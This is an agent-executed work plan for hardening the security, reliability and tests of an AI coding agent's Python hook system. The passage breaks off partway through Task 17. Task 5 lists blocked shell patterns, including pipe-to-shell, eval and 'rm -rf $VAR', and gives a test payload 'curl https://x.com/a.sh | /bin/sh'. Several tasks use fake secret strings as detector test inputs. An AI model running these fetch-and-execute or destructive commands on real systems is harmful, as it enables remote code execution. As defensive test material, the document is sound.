# OAL v5 Security + Reliability + Correctness Hardening

## TL;DR

> **Quick Summary**: Fix 37 verified issues across OAL's hook system — secret detection regex bypasses, race conditions in state files, broken command references, and test coverage gaps. All fixes stay within existing architecture, stdlib-only, no new features.
> 
> **Deliverables**:
> - Hardened secret detection patterns in post-write.py (fix 3 bypasses + add 10 missing patterns)
> - Atomic file writes in circuit-breaker.py, tool-ledger.py, pre-compact.py
> - Fixed command references across 8 command files
> - 6 new test files bringing hook coverage from 69% to ~100%
> - Full regression: all 224+ existing tests still pass
> 
> **Estimated Effort**: Large (4 phases, ~24 tasks)
> **Parallel Execution**: YES — 4 waves
> **Critical Path**: Baseline tests → Security fixes → Reliability fixes → Reference fixes → New tests → Final verification

---

## Context

### Original Request
User asked to "check for any potential issues, bugs with upgraded OMC (OAL)" — a comprehensive audit of the OAL hook system.

### Audit Summary
6 parallel explore agents audited: all 17 hooks, settings.json, 13 commands, security bypass vectors, state management integrity, and test coverage. Raw findings: 41 issues.

### Metis Review — Critical Corrections Applied
1. **Finding #12 REMOVED**: policy_engine.py, state_migration.py, trust_review.py are shared libraries imported by other hooks — NOT orphaned hooks. They don't need settings.json registration.
2. **Finding #8 RECHARACTERIZED**: failure-tracker.json is created at runtime by circuit-breaker.py on first failure — fix is graceful degradation in commands, not creating the file.
3. **Finding #5 RECHARACTERIZED**: Circuit-breaker race is read-before-lock + fallback-without-lock, not "lock after file open."
4. **Finding #4 RECHARACTERIZED**: policy_engine.py uses a blocklist (not sandbox) — concern is blocklist completeness, not path traversal per se.
5. **Test coverage recalculated**: 9/13 event hooks tested = 69% (not 62.5%) — shared libraries aren't event hooks.
6. **NEW**: post-write.py and stop-gate.py lack standard sys.path setup (import fragility).
7. **NEW**: quality-gate.py is deployed but has no source in OAL repo (out of scope).

### Research Findings
- All hooks use _common.py crash handlers with `os._exit(0)` — good baseline
- pytest infrastructure with helpers.py is solid — test additions are straightforward
- Hooks deploy via symlinks from ~/.claude/hooks/ to OAL hooks/ directory
- Stop event has 2 groups: quality-gate(10s) + [stop-gate(15s) + test-validator(30s) + quality-runner(180s)]
- Claude Code hook execution: groups are sequential, hooks within groups are parallel

---

## Work Objectives

### Core Objective
Harden OAL's security, reliability, and correctness without changing architecture, adding dependencies, or introducing new features.

### Concrete Deliverables
- `hooks/post-write.py` — Fixed regex patterns + 10 new secret detection patterns
- `hooks/circuit-breaker.py` — Atomic writes + read-under-lock
- `hooks/tool-ledger.py` — Atomic rotation
- `hooks/pre-compact.py` — Atomic handoff writes
- `hooks/policy_engine.py` — Expanded bash command patterns
- `hooks/secret-guard.py` — Flush before exit
- `hooks/post-write.py`, `hooks/stop-gate.py` — Standardized sys.path setup
- 8 command files — Fixed references and graceful degradation
- `README.md` — Updated hook count
- 6 new test files in `tests/hooks/`
- Expanded tests for `policy_engine.py` and `post-write.py`

### Definition of Done
- [ ] `pytest tests/ -x -q` → all pass, count ≥ 224 + new tests
- [ ] `grep -n 'exit\|sys.exit' hooks/*.py` → only `exit(0)` on all paths
- [ ] post-write.py scanned against OAL source → zero false positives
- [ ] Each new secret pattern has ≥1 positive + ≥1 negative test case

### Must Have
- All 3 regex bypass fixes (AWS, API key, JWT)
- 10 missing secret patterns
- Atomic writes for 3 state hooks
- Graceful degradation for failure-tracker.json in commands
- Test files for untested hooks

### Must NOT Have (Guardrails)
- NO changes to _common.py without running ALL 224 tests
- NO non-stdlib imports (no filelock, no atomicwrites)
- NO changes to comment-skip patterns in post-write.py line 135
- NO shared atomic-write utility in _common.py — each hook gets its own fix
- NO restructuring Stop hook groups or changing timeout values
- NO bringing quality-gate.py into the source tree
- NO multi-line secret detection (different architecture)
- NO adding secret patterns beyond the 10 identified (no Alibaba Cloud, Oracle Cloud, etc.)
- NO refactoring sys.path setup in hooks beyond post-write.py and stop-gate.py
- NO creating conftest.py unless required for new test files to work

---

## Verification Strategy

> **ZERO HUMAN INTERVENTION** — ALL verification is agent-executed. No exceptions.

### Test Decision
- **Infrastructure exists**: YES
- **Automated tests**: Tests-after (fix first, add tests for fixes + untested hooks)
- **Framework**: pytest (existing)
- **Baseline**: Run `pytest tests/ -x -q` BEFORE any changes — record exact pass count

### QA Policy
Every task MUST include agent-executed QA scenarios.
Evidence saved to `.sisyphus/evidence/task-{N}-{scenario-slug}.{ext}`.

- **Hook fixes**: Use Bash — pipe JSON payload to hook, assert exit code + stdout/stderr
- **Regex fixes**: Use Bash — python3 one-liner with re.search, assert match/no-match
- **Test additions**: Use Bash — `pytest tests/hooks/test_{name}.py -v`, assert all pass
- **Command fixes**: Use Bash — read file, grep for fixed references

---

## Execution Strategy

### Parallel Execution Waves

```
Wave 1 (Start Immediately — baseline + security):
├── Task 1: Run baseline tests + record pass count [quick]
├── Task 2: Fix post-write.py regex bypasses (AWS, API key, JWT) [deep]
├── Task 3: Add 10 missing secret patterns to post-write.py [deep]
├── Task 4: Fix post-write.py private key pattern [quick]
├── Task 5: Expand policy_engine.py bash command patterns [unspecified-high]
├── Task 6: Fix secret-guard.py deny_decision flush [quick]
└── Task 7: Standardize sys.path in post-write.py and stop-gate.py [quick]

Wave 2 (After Wave 1 — reliability + references, MAX PARALLEL):
├── Task 8: Atomic writes for circuit-breaker.py (depends: 1) [deep]
├── Task 9: Atomic rotation for tool-ledger.py (depends: 1) [deep]
├── Task 10: Atomic handoff writes for pre-compact.py (depends: 1) [unspecified-high]
├── Task 11: Standardize directory naming in commands (depends: 1) [quick]
├── Task 12: Fix OAL:ship.md template path (depends: 1) [quick]
├── Task 13: Fix OAL:learn.md skills-index reference (depends: 1) [quick]
├── Task 14: Add graceful degradation for failure-tracker.json (depends: 1) [quick]
├── Task 15: Fix OAL:handoff.md project.md reference (depends: 1) [quick]
└── Task 16: Update README hook count + settings.json docs (depends: 1) [quick]

Wave 3 (After Waves 1+2 — tests):
├── Task 17: Add tests for post-write.py secret patterns (depends: 2,3,4) [deep]
├── Task 18: Add test file for circuit-breaker.py (depends: 8) [deep]
├── Task 19: Add test file for test-validator.py (depends: 1) [unspecified-high]
├── Task 20: Add test file for tool-ledger.py (depends: 9) [unspecified-high]
├── Task 21: Add test file for pre-compact.py (depends: 10) [unspecified-high]
├── Task 22: Add dedicated test file for secret-guard.py (depends: 6,7) [unspecified-high]
└── Task 23: Expand policy_engine.py tests (depends: 5) [unspecified-high]

Wave FINAL (After ALL tasks — independent review, 4 parallel):
├── Task F1: Plan compliance audit (oracle)
├── Task F2: Code quality review (unspecified-high)
├── Task F3: Full regression + false positive scan (unspecified-high)
└── Task F4: Scope fidelity check (deep)

Critical Path: Task 1 → Task 2 → Task 8 → Task 18 → F1-F4
Parallel Speedup: ~65% faster than sequential
Max Concurrent: 9 (Wave 2)
```

### Dependency Matrix

| Task | Depends On | Blocks | Wave |
|------|-----------|--------|------|
| 1 | — | 2-16 | 1 |
| 2 | 1 | 17 | 1 |
| 3 | 1 | 17 | 1 |
| 4 | 1 | 17 | 1 |
| 5 | 1 | 23 | 1 |
| 6 | 1 | 22 | 1 |
| 7 | 1 | 22 | 1 |
| 8 | 1 | 18 | 2 |
| 9 | 1 | 20 | 2 |
| 10 | 1 | 21 | 2 |
| 11-16 | 1 | F1-F4 | 2 |
| 17 | 2,3,4 | F1-F4 | 3 |
| 18 | 8 | F1-F4 | 3 |
| 19-23 | various | F1-F4 | 3 |
| F1-F4 | ALL | — | FINAL |

### Agent Dispatch Summary

- **Wave 1**: 7 tasks — T1 → `quick`, T2-T3 → `deep`, T4 → `quick`, T5 → `unspecified-high`, T6-T7 → `quick`
- **Wave 2**: 9 tasks — T8-T9 → `deep`, T10 → `unspecified-high`, T11-T16 → `quick`
- **Wave 3**: 7 tasks — T17-T18 → `deep`, T19-T23 → `unspecified-high`
- **Wave FINAL**: 4 tasks — F1 → `oracle`, F2-F3 → `unspecified-high`, F4 → `deep`

---

## TODOs

- [ ] 1. Run Baseline Tests + Record Pass Count

  **What to do**:
  - Run `pytest tests/ -x -q` and record exact pass count (expected ~224)
  - Run `grep -cn 'sys.exit\|exit(' hooks/*.py` to baseline exit-code discipline
  - Save baseline numbers to `.sisyphus/evidence/task-1-baseline.txt`

  **Must NOT do**:
  - Do not modify any files

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: NO — must complete before all other tasks
  - **Parallel Group**: Wave 1 (solo prerequisite)
  - **Blocks**: Tasks 2-16
  - **Blocked By**: None

  **References**:
  - `pytest.ini` — test configuration (testpaths = tests)
  - `tests/hooks/helpers.py` — shared test utilities

  **Acceptance Criteria**:
  - [ ] `pytest tests/ -x -q` exits 0
  - [ ] Pass count recorded in evidence file

  ```
  Scenario: Record test baseline
    Tool: Bash
    Steps:
      1. Run: pytest tests/ -x -q 2>&1 | tee .sisyphus/evidence/task-1-baseline.txt
      2. Assert: exit code 0
      3. Assert: output contains "passed"
    Expected Result: All tests pass, count recorded
    Evidence: .sisyphus/evidence/task-1-baseline.txt
  ```

  **Commit**: NO (no files changed)

---

- [ ] 2. Fix post-write.py Regex Bypasses (AWS, API Key, JWT)

  **What to do**:
  - Fix AWS secret key pattern (line ~84): Change `{40}` to `{40,}` to catch 41+ char keys
  - Fix generic API key pattern (line ~88): Add non-capturing group for unquoted values after the quoted pattern
  - Fix JWT pattern (line ~114): Make `eyJ` prefix optional, handle padding characters
  - Add word boundaries where appropriate to prevent partial matches
  - Keep patterns at their current positions in the list (order matters — line 148 breaks on first match)

  **Must NOT do**:
  - Do not change comment-skip patterns (line 135)
  - Do not add multi-line detection
  - Do not change the per-line scan architecture

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-patterns`]
    - `python-patterns`: Regex correctness and Python string handling

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 3-7)
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 17
  - **Blocked By**: Task 1

  **References**:
  - `hooks/post-write.py:80-120` — Current SECRET_PATTERNS list
  - `hooks/post-write.py:130-155` — Line-by-line scan loop with break-on-first-match
  - `hooks/post-write.py:135` — Comment skip patterns (DO NOT MODIFY)

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/ -x -q` → still passes (no regression)
  - [ ] AWS 41-char key detected: `python3 -c "import re; assert re.search(r'PATTERN', 'aws_secret_access_key=A123456789012345678901234567890123456789X')"` exits 0
  - [ ] Unquoted API key detected: `python3 -c "import re; assert re.search(r'PATTERN', 'api_key = AKIA1234567890ABCDEF1234567890AB')"` exits 0
  - [ ] Non-eyJ JWT detected

  ```
  Scenario: AWS key with 41+ chars now detected
    Tool: Bash
    Steps:
      1. Create temp file with: aws_secret_access_key=A123456789012345678901234567890123456789Extra
      2. Run: echo '{"tool_input":{"file_path":"TEMPFILE"}}' | python3 hooks/post-write.py 2>&1
      3. Assert: stderr contains "SECRET DETECTED" or "Potential secret"
    Expected Result: Secret detected in output
    Evidence: .sisyphus/evidence/task-2-aws-bypass.txt

  Scenario: Legitimate code not flagged
    Tool: Bash
    Steps:
      1. Create temp file with: aws_client = boto3.client('s3')
      2. Run: echo '{"tool_input":{"file_path":"TEMPFILE"}}' | python3 hooks/post-write.py 2>&1
      3. Assert: stderr does NOT contain "SECRET DETECTED"
    Expected Result: No false positive
    Evidence: .sisyphus/evidence/task-2-no-false-positive.txt
  ```

  **Commit**: YES (groups with Wave 1)
  - Message: `fix(security): harden secret detection regex patterns`
  - Files: `hooks/post-write.py`
  - Pre-commit: `pytest tests/hooks/ -x -q`

---

- [ ] 3. Add 10 Missing Secret Patterns to post-write.py

  **What to do**:
  - Add these patterns to SECRET_PATTERNS list at the END (before the generic catch-all if any):
    1. Azure: `DefaultEndpointsProtocol=https;AccountName=` or `AZURE_CLIENT_SECRET`
    2. GCP service account: `"type":\s*"service_account"`
    3. Databricks: `dapi[a-z0-9]{32}`
    4. HashiCorp Vault: `hvs\.[a-zA-Z0-9]{20,}`
    5. Slack webhook: `https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}`
    6. Discord webhook: `https://discord(?:app)?\.com/api/webhooks/`
    7. Twilio: `SK[a-f0-9]{32}` (API key) or `AC[a-f0-9]{32}` (Account SID)
    8. Mailchimp: `[a-f0-9]{32}-us[0-9]{1,2}`
    9. SendGrid: `SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}`
    10. Database URL expansion: Add `mariadb|mssql|oracle|elasticsearch|cassandra` to existing DB URL pattern
  - Each pattern: `(r"REGEX", "Description")` tuple
  - Add comment `# Added by OAL hardening audit` above the new block

  **Must NOT do**:
  - Do not add patterns beyond these 10 (no Alibaba Cloud, Oracle Cloud, etc.)
  - Do not modify comment-skip patterns
  - Do not reorder existing patterns

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-patterns`]

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 2, 4-7)
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 17
  - **Blocked By**: Task 1

  **References**:
  - `hooks/post-write.py:80-120` — Current SECRET_PATTERNS list (22 patterns)
  - `hooks/post-write.py:112` — Existing DB URL pattern to expand

  **Acceptance Criteria**:
  - [ ] `pytest tests/hooks/ -x -q` → still passes
  - [ ] Each new pattern has ≥1 positive match test (inline python3 -c)
  - [ ] post-write.py scanned against `hooks/post-write.py` itself → zero false positives

  ```
  Scenario: Azure secret detected
    Tool: Bash
    Steps:
      1. Create temp file with: AZURE_CLIENT_SECRET=abc123def456ghi789
      2. Run post-write.py against it
      3. Assert: stderr contains secret warning
    Expected Result: Azure pattern matches
    Evidence: .sisyphus/evidence/task-3-azure.txt

  Scenario: Slack webhook detected
    Tool: Bash
    Steps:
      1. Create temp file with: https://hooks.slack.com/services/T01234567/B01234567/abcdefghijklmnopqrstuvwx
      2. Run post-write.py against it
      3. Assert: stderr contains secret warning
    Expected Result: Slack webhook pattern matches
    Evidence: .sisyphus/evidence/task-3-slack.txt
  ```

  **Commit**: YES (groups with Task 2)
  - Files: `hooks/post-write.py`

---

- [ ] 4. Fix post-write.py Private Key Pattern

  **What to do**:
  - Expand pattern at line ~86 to include:
    - `ENCRYPTED` variant: `-----BEGIN ENCRYPTED PRIVATE KEY-----`
    - PKCS#8 plain: `-----BEGIN PRIVATE KEY-----` (no algorithm prefix)
    - Fix regex: `(RSA |EC |DSA |OPENSSH |ENCRYPTED )?` → make space optional after algorithm

  **Must NOT do**:
  - Do not add PuTTY or non-PEM formats (different architecture)

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 17
  - **Blocked By**: Task 1

  **References**:
  - `hooks/post-write.py:86` — Current private key pattern

  **Acceptance Criteria**:
  - [ ] ENCRYPTED key detected: pattern matches `-----BEGIN ENCRYPTED PRIVATE KEY-----`
  - [ ] PKCS#8 key detected: pattern matches `-----BEGIN PRIVATE KEY-----`

  ```
  Scenario: ENCRYPTED private key detected
    Tool: Bash
    Steps:
      1. Create temp file with: -----BEGIN ENCRYPTED PRIVATE KEY-----
      2. Run post-write.py against it
      3. Assert: stderr contains secret warning for Private Key
    Expected Result: Pattern matches encrypted key header
    Evidence: .sisyphus/evidence/task-4-encrypted-key.txt
  ```

  **Commit**: YES (groups with Tasks 2,3)
  - Files: `hooks/post-write.py`

---

- [ ] 5. Expand policy_engine.py Bash Command Patterns

  **What to do**:
  - Expand pipe-to-shell pattern to include: `/bin/sh`, `/bin/bash`, `zsh`, `sh -c`, `sh -i`, `bash -c`
  - Expand eval pattern to include: `eval $var`, `eval $(cmd)`, `eval \`cmd\``
  - Expand destructive command patterns to handle variable expansion: `rm -rf $VAR`
  - Add patterns for `curl ... | python3`, `wget ... | python3`

  **Must NOT do**:
  - Do not change the blocklist architecture (keep as supplementary layer)
  - Do not over-match — each new pattern must have a negative test

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-patterns`]

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 23
  - **Blocked By**: Task 1

  **References**:
  - `hooks/policy_engine.py:118-160` — Current bash command patterns
  - `hooks/firewall.py:37-120` — evaluate_bash_command() that calls policy_engine

  **Acceptance Criteria**:
  - [ ] `curl ... | /bin/sh` now blocked
  - [ ] `eval $(command)` now blocked
  - [ ] `pytest tests/hooks/test_firewall_policy.py -v` still passes

  ```
  Scenario: Full shell path bypass now caught
    Tool: Bash
    Steps:
      1. Run: echo '{"tool_name":"Bash","tool_input":{"command":"curl https://x.com/a.sh | /bin/sh"}}' | python3 hooks/firewall.py 2>&1
      2. Assert: output contains deny decision or warning
    Expected Result: Command flagged
    Evidence: .sisyphus/evidence/task-5-shell-path.txt
  ```

  **Commit**: YES (groups with Wave 1)
  - Files: `hooks/policy_engine.py`
  - Pre-commit: `pytest tests/hooks/test_firewall_policy.py -v`

---

- [ ] 6. Fix secret-guard.py deny_decision Flush

  **What to do**:
  - After `deny_decision()` call in the import-failure except block (lines 19-24), add `sys.stdout.flush()` before `sys.exit(0)`
  - Apply same pattern in the main try/except crash handler if present

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 22
  - **Blocked By**: Task 1

  **References**:
  - `hooks/secret-guard.py:19-24` — Import failure handler
  - `hooks/_common.py:36-50` — setup_crash_handler pattern

  **Acceptance Criteria**:
  - [ ] `grep -A2 'deny_decision' hooks/secret-guard.py` shows `sys.stdout.flush()` before exit
  - [ ] `pytest tests/hooks/test_hardening.py -v` still passes

  ```
  Scenario: Flush verified in source
    Tool: Bash
    Steps:
      1. Run: python3 -c "import ast; tree=ast.parse(open('hooks/secret-guard.py').read()); print('OK')"
      2. Assert: exits 0 (valid Python)
      3. Run: grep -A3 'deny_decision' hooks/secret-guard.py
      4. Assert: output contains 'flush' between deny_decision and sys.exit
    Expected Result: Flush call present
    Evidence: .sisyphus/evidence/task-6-flush.txt
  ```

  **Commit**: YES (groups with Wave 1)
  - Files: `hooks/secret-guard.py`

---

- [ ] 7. Standardize sys.path in post-write.py and stop-gate.py

  **What to do**:
  - Add standard `HOOKS_DIR` + `sys.path.insert` pattern to `post-write.py` (currently imports `state_migration` without sys.path setup)
  - Fix `stop-gate.py` line 20: move `from state_migration import resolve_state_file` after sys.path setup at line 94
  - Follow pattern from `hooks/firewall.py:10-13`

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 1
  - **Blocks**: Task 22
  - **Blocked By**: Task 1

  **References**:
  - `hooks/firewall.py:10-13` — Canonical sys.path setup pattern to follow
  - `hooks/post-write.py:8` — Missing sys.path before import
  - `hooks/stop-gate.py:20,94` — Import before sys.path setup

  **Acceptance Criteria**:
  - [ ] `python3 -c "exec(open('hooks/post-write.py').read())"` doesn't fail with ImportError (when run from project root)
  - [ ] `pytest tests/hooks/ -x -q` still passes

  ```
  Scenario: post-write.py imports succeed from any CWD
    Tool: Bash
    Steps:
      1. Run from /tmp: cd /tmp && echo '{"tool_input":{"file_path":"/dev/null"}}' | python3 /path/to/hooks/post-write.py 2>&1
      2. Assert: exit code 0 (no ImportError)
    Expected Result: Import works regardless of CWD
    Evidence: .sisyphus/evidence/task-7-import.txt
  ```

  **Commit**: YES (groups with Wave 1)
  - Files: `hooks/post-write.py`, `hooks/stop-gate.py`

---

- [ ] 8. Atomic Writes for circuit-breaker.py

  **What to do**:
  - Fix read-before-lock race (lines 61-68): Move file read INSIDE the lock acquisition
  - Fix fallback path (lines 123-128): On BlockingIOError, do NOT write at all (fail silently, log to stderr) instead of writing without lock
  - Replace truncate-then-write with `tempfile.NamedTemporaryFile` + `os.replace()` pattern:
    ```python
    import tempfile
    fd_tmp = tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(tracker_path), delete=False, suffix='.tmp')
    json.dump(data, fd_tmp)
    fd_tmp.close()
    os.replace(fd_tmp.name, tracker_path)
    ```
  - Add graceful handling for corrupt JSON (malformed tracker file): wrap json.loads in try/except, reset to empty dict on failure

  **Must NOT do**:
  - Do not use non-stdlib locking (no filelock)
  - Do not create shared utility in _common.py

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-patterns`]

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 9-16)
  - **Parallel Group**: Wave 2
  - **Blocks**: Task 18
  - **Blocked By**: Task 1

  **References**:
  - `hooks/circuit-breaker.py:61-68` — Read-without-lock section
  - `hooks/circuit-breaker.py:110-130` — Write section with lock
  - `hooks/circuit-breaker.py:123-128` — Fallback-without-lock (remove this)

  **Acceptance Criteria**:
  - [ ] No `open(tracker_path, "a+")` pattern remains — replaced with tempfile+replace
  - [ ] Lock acquired BEFORE any file read/write
  - [ ] Fallback path logs to stderr but does NOT write without lock
  - [ ] `pytest tests/hooks/ -x -q` still passes

  ```
  Scenario: Corrupt tracker file handled gracefully
    Tool: Bash
    Steps:
      1. Create temp dir with .oal/state/ledger/failure-tracker.json containing '{invalid json'
      2. Run circuit-breaker.py with a failure payload (Bash tool, exit_code=1)
      3. Assert: exit code 0
      4. Assert: failure-tracker.json now contains valid JSON
    Expected Result: Corrupt file recovered, no crash
    Evidence: .sisyphus/evidence/task-8-corrupt-recovery.txt
  ```

  **Commit**: YES (groups with Wave 2)
  - Files: `hooks/circuit-breaker.py`
  - Pre-commit: `pytest tests/hooks/ -x -q`

---

- [ ] 9. Atomic Rotation for tool-ledger.py

  **What to do**:
  - Wrap size-check + rotation in a lock:
    1. Acquire lock on ledger file
    2. Check size
    3. If rotation needed: copy current to .1 archive (not move — safer), then truncate
    4. Release lock
  - Before archiving, check if .1 exists and back it up to .2 (one level of backup)
  - Use `os.replace()` for the archive operation (atomic)

  **Must NOT do**:
  - Do not use non-stdlib imports
  - Do not create shared utility

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-patterns`]

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 8, 10-16)
  - **Parallel Group**: Wave 2
  - **Blocks**: Task 20
  - **Blocked By**: Task 1

  **References**:
  - `hooks/tool-ledger.py:30-45` — Current rotation logic
  - `hooks/tool-ledger.py:112-116` — fcntl locking pattern

  **Acceptance Criteria**:
  - [ ] Rotation uses lock (no TOCTOU between size check and move)
  - [ ] Archive .1 is backed up to .2 before overwrite
  - [ ] `pytest tests/hooks/ -x -q` still passes

  ```
  Scenario: Rotation preserves entries
    Tool: Bash
    Steps:
      1. Create temp ledger file at 5.1MB with known content
      2. Run tool-ledger.py with a Bash tool payload
      3. Assert: original content moved to .1 archive
      4. Assert: new entry in fresh ledger file
    Expected Result: No entries lost during rotation
    Evidence: .sisyphus/evidence/task-9-rotation.txt
  ```

  **Commit**: YES (groups with Wave 2)
  - Files: `hooks/tool-ledger.py`

---

- [ ] 10. Atomic Handoff Writes for pre-compact.py

  **What to do**:
  - Replace direct `open(handoff_path, 'w')` with tempfile + os.replace() pattern for both:
    - `handoff.md`
    - `handoff-portable.md`
  - Pattern:
    ```python
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', dir=state_dir, delete=False, suffix='.tmp') as tmp:
        tmp.write(content)
    os.replace(tmp.name, handoff_path)
    ```

  **Recommended Agent Profile**:
  - **Category**: `unspecified-high`
  - **Skills**: [`python-patterns`]

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 8-9, 11-16)
  - **Parallel Group**: Wave 2
  - **Blocks**: Task 21
  - **Blocked By**: Task 1

  **References**:
  - `hooks/pre-compact.py:115-123` — Current handoff write section

  **Acceptance Criteria**:
  - [ ] No direct `open(handoff_path, 'w')` remains — replaced with tempfile+replace
  - [ ] `pytest tests/hooks/ -x -q` still passes

  ```
  Scenario: Handoff write is atomic
    Tool: Bash
    Steps:
      1. Verify hooks/pre-compact.py does not contain 'open(.*handoff.*"w"'
      2. Run: grep -n 'tempfile\|os.replace' hooks/pre-compact.py
      3. Assert: both tempfile and os.replace are present
    Expected Result: Atomic write pattern used
    Evidence: .sisyphus/evidence/task-10-atomic-handoff.txt
  ```

  **Commit**: YES (groups with Wave 2)
  - Files: `hooks/pre-compact.py`

---

- [ ] 11. Standardize Directory Naming in Commands

  **What to do**:
  - Pick ONE name: `patterns/` (used by OAL:init.md) — standardize everywhere
  - Update `commands/OAL:code-review.md` line 62: `.oal/knowledge/domain-patterns/` → `.oal/knowledge/patterns/`
  - Update `commands/OAL:deep-plan.md` line 123: `.oal/knowledge/domain-patterns/` → `.oal/knowledge/patterns/`
  - Verify OAL:init.md already uses `patterns/` (line 52, 114) — no change needed

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES (with Tasks 8-10, 12-16)
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] `grep -rn 'domain-patterns' commands/` returns empty (no occurrences)
  - [ ] `grep -rn 'knowledge/patterns' commands/` returns all references consistently

  **Commit**: YES (groups with Wave 2)
  - Files: `commands/OAL:code-review.md`, `commands/OAL:deep-plan.md`

---

- [ ] 12. Fix OAL:ship.md Template Path

  **What to do**:
  - Line 11: Change `~/.claude/templates/oal/idea.yml` → `./templates/idea.yml` (local template exists)
  - Keep the home directory path as fallback if local doesn't exist

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] `grep 'templates.*idea.yml' commands/OAL:ship.md` shows local path first

  **Commit**: YES (groups with Wave 2)
  - Files: `commands/OAL:ship.md`

---

- [ ] 13. Fix OAL:learn.md Skills-Index Reference

  **What to do**:
  - Line 71: Replace `.oal/skills-index.json` with graceful check — "If `.oal/skills-index.json` exists, update it; otherwise create it"
  - Lines 38, 41, 78: Standardize skills directory to `.oal/skills/` (project-level, not `~/.config/oal/skills/`)
  - Add note that skill directory is created on first use

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] `grep -n 'skills-index' commands/OAL:learn.md` shows graceful handling
  - [ ] Single consistent skills directory path used throughout

  **Commit**: YES (groups with Wave 2)
  - Files: `commands/OAL:learn.md`

---

- [ ] 14. Add Graceful Degradation for failure-tracker.json in Commands

  **What to do**:
  - failure-tracker.json is created at RUNTIME by circuit-breaker.py on first failure — it's intentionally absent initially
  - In each command that references it, add: "If `.oal/state/ledger/failure-tracker.json` does not exist, skip failure analysis (no failures recorded yet)"
  - Commands to update:
    - `OAL:health-check.md` (line 30)
    - `OAL:escalate.md` (line 18)
    - `OAL:handoff.md` (line 28)
    - `OAL:deep-plan.md` (line 19)

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] Each of 4 commands contains "if exists" or "skip if missing" language around failure-tracker.json

  **Commit**: YES (groups with Wave 2)
  - Files: 4 command files

---

- [ ] 15. Fix OAL:handoff.md project.md Reference

  **What to do**:
  - Line 26: Remove reference to `project.md` — only `profile.yaml` exists in `.oal/state/`
  - Change "Read .oal/state/profile.yaml or project.md" → "Read .oal/state/profile.yaml"

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] `grep -n 'project.md' commands/OAL:handoff.md` returns empty

  **Commit**: YES (groups with Wave 2)
  - Files: `commands/OAL:handoff.md`

---

- [ ] 16. Update README Hook Count + Settings Documentation

  **What to do**:
  - README.md: Change "11 hooks" → "15 hooks" (13 event hooks + _common.py + state_migration.py library). Or specify clearly: "13 event hooks + 4 shared libraries"
  - Add note that `quality-gate.py` is deployed externally (not in OAL source tree)
  - Document Stop event timeout stacking: "Stop event total: up to 235s (quality-gate 10s + stop-gate 15s + test-validator 30s + quality-runner 180s)"

  **Recommended Agent Profile**:
  - **Category**: `quick`
  - **Skills**: []

  **Parallelization**:
  - **Can Run In Parallel**: YES
  - **Parallel Group**: Wave 2
  - **Blocks**: F1-F4
  - **Blocked By**: Task 1

  **Acceptance Criteria**:
  - [ ] README.md no longer says "11 hooks"
  - [ ] Stop event timeout is documented

  **Commit**: YES (groups with Wave 2 — chore commit)
  - Message: `docs: update hook count and document Stop event timeout`
  - Files: `README.md`

---

- [ ] 17. Add Tests for post-write.py Secret Patterns

  **What to do**:
  - Create `tests/hooks/test_post_write_patterns.py`
  - For EACH new/fixed pattern: ≥1 positive test (secret detected) + ≥1 negative test (no false positive)
  - Test patterns:
    - AWS 41+ char key (fixed) → positive + negative
    - Unquoted API key (fixed) → positive + negative
    - JWT without eyJ (fixed) → positive + negative
    - ENCRYPTED private key (fixed) → positive + negative
    - All 10 new patterns → positive + negative each
  - Use `helpers.make_file_payload()` + `helpers.run_hook_json()` pattern
  - Self-test: run post-write.py against every `hooks/*.py` file → zero false positives

  **Recommended Agent Profile**:
  - **Category**: `deep`
  - **Skills**: [`python-testing`]
